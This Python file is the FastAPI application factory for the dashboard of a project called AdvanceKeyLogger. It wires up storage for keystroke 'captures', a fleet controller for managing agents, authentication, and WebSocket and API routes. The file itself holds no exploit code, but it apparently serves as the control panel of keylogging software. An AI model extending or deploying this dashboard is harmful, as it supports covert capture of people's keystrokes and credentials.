"""FastAPI application factory for the AdvanceKeyLogger dashboard."""

from __future__ import annotations

import logging
import os
from pathlib import Path

from fastapi import FastAPI
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from starlette.middleware.sessions import SessionMiddleware
from contextlib import asynccontextmanager

from config.settings import Settings
from dashboard.auth import auth_router
from dashboard.routes.api import api_router
from dashboard.routes.fleet_api import router as fleet_api_router
from dashboard.routes.fleet_dashboard_api import router as fleet_dashboard_router
from dashboard.routes.fleet_ui import router as fleet_ui_router
from dashboard.routes.pages import pages_router
from dashboard.routes.websocket import ws_router, set_storage_references

logger = logging.getLogger(__name__)

BASE_DIR = Path(__file__).parent
_INSECURE_DEFAULT = "change-me-in-production"


@asynccontextmanager
async def lifespan(app: FastAPI):
    """Manage application lifespan events."""
    settings = Settings()

    # Store config in app.state for access by route handlers
    # This is used by fleet_api.py for signature verification settings
    app.state.config = settings.as_dict() if hasattr(settings, "as_dict") else (
        settings._config if hasattr(settings, "_config") else {}
    )

    # Initialize SQLiteStorage for captures (used by WebSocket handlers)
    sqlite_storage = None
    try:
        from storage.sqlite_storage import SQLiteStorage

        sqlite_path = settings.get("storage.sqlite_path", "./data/captures.db")
        sqlite_storage = SQLiteStorage(sqlite_path)
        app.state.sqlite_storage = sqlite_storage
        logger.info("SQLite storage initialized: %s", sqlite_path)
    except Exception as e:
        logger.warning("Failed to initialize SQLite storage: %s", e)

    # Initialize fleet controller if enabled
    fleet_storage = None  # Track for cleanup on failure
    if settings.get("fleet.enabled"):
        try:
            from storage.fleet_storage import FleetStorage
            from fleet.controller import FleetController
            from fleet.auth import FleetAuth

            db_path = settings.get("fleet.database_path", "./data/fleet.db")
            fleet_storage = FleetStorage(db_path)

            # Auth config
            jwt_secret = settings.get("fleet.auth.jwt_secret", "change-me-in-production")
            auth_service = FleetAuth(jwt_secret)

            # Controller config - copy to avoid mutating Settings._config
            controller_config = dict(settings.get("fleet.controller", {}))
            controller_config.update(settings.get("fleet.auth", {}))

            controller = FleetController(controller_config, fleet_storage)
            await controller.start()

            app.state.fleet_storage = fleet_storage
            app.state.fleet_controller = controller
            app.state.fleet_auth = auth_service

            # Set storage references for WebSocket handlers
            set_storage_references(
                storage=sqlite_storage,
                fleet_storage=fleet_storage,
                fleet_controller=controller,
            )

            logger.info("Fleet controller started")

        except Exception as e:
            logger.error(f"Failed to start fleet controller: {e}")
            # Don't crash app if fleet fails — close FleetStorage to prevent leak
            if fleet_storage is not None:
                try:
                    fleet_storage.close()
                except Exception:
                    pass
                fleet_storage = None
            app.state.fleet_controller = None
            # Still set SQLite storage for WebSocket handlers even if fleet fails
            if sqlite_storage:
                set_storage_references(storage=sqlite_storage)
    else:
        # Fleet disabled, but still set SQLite storage for WebSocket handlers
        if sqlite_storage:
            set_storage_references(storage=sqlite_storage)

    yield

    # Shutdown
    if hasattr(app.state, "fleet_controller") and app.state.fleet_controller:
        await app.state.fleet_controller.stop()
        if hasattr(app.state, "fleet_storage"):
            app.state.fleet_storage.close()
        logger.info("Fleet controller stopped")

    # Close SQLite storage
    if sqlite_storage:
        sqlite_storage.close()
        logger.info("SQLite storage closed")


def create_app(secret_key: str = _INSECURE_DEFAULT) -> FastAPI:
    """Create and configure the FastAPI application."""
    env = os.environ.get("APP_ENV", "development").lower()

    if secret_key == _INSECURE_DEFAULT and env != "development":
        raise RuntimeError(
            "Insecure default secret_key detected in non-development mode. "
            "Set a strong secret_key in config or the APP_ENV=development "
            "environment variable to allow the default."
        )
    if secret_key == _INSECURE_DEFAULT:
        logger.warning(
            "Using insecure default secret_key — do NOT use in production (APP_ENV=%s)",
            env,
        )

    app = FastAPI(
        title="AdvanceKeyLogger Dashboard",
        version="1.0.0",
        docs_url="/api/docs",
        redoc_url=None,
        lifespan=lifespan,
    )

    app.add_middleware(SessionMiddleware, secret_key=secret_key)

    app.mount(
        "/static",
        StaticFiles(directory=str(BASE_DIR / "static")),
        name="static",
    )

    templates = Jinja2Templates(directory=str(BASE_DIR / "templates"))
    app.state.templates = templates

    app.include_router(auth_router)
    app.include_router(pages_router)
    app.include_router(api_router, prefix="/api")
    app.include_router(fleet_api_router, prefix="/api/v1/fleet")
    app.include_router(fleet_dashboard_router, prefix="/api/dashboard/fleet")
    app.include_router(fleet_ui_router)
    app.include_router(ws_router)

    return app
